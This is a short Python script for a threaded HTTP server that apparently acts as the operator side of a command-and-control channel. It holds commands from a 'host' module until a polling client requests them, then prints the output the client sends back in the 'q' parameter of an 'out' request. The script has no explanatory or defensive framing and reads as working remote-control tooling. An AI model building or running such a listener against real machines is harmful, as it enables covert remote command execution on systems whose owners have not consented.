#!/usr/bin/env python3

from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from time import sleep
from urllib.parse import urlparse, unquote_plus, parse_qs
import threading
import traceback

import host


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if "out" in self.path:
                rq_url = urlparse(self.path)
                rq_param = parse_qs(rq_url.query)
                print()
                for i in rq_param["q"]:
                    print(i.strip())

                self.send_response(200)
                self.end_headers()
                self.wfile.write(host.cmd.encode())

                return
        except:
            traceback.print_exc()
        while host.cmd == "":
            sleep(0.25)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(host.cmd.encode())

        host.cmd = ""

    def log_message(self, format, *args):
        return


class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass


def run():
    host = "127.0.0.1"
    port = 8080
    print(f"Started listening on port {port}...")

    # http = ThreadingSimpleServer((host, port), BaseHTTPRequestHandler)
    http = ThreadingSimpleServer((host, port), Handler)
    http.serve_forever()
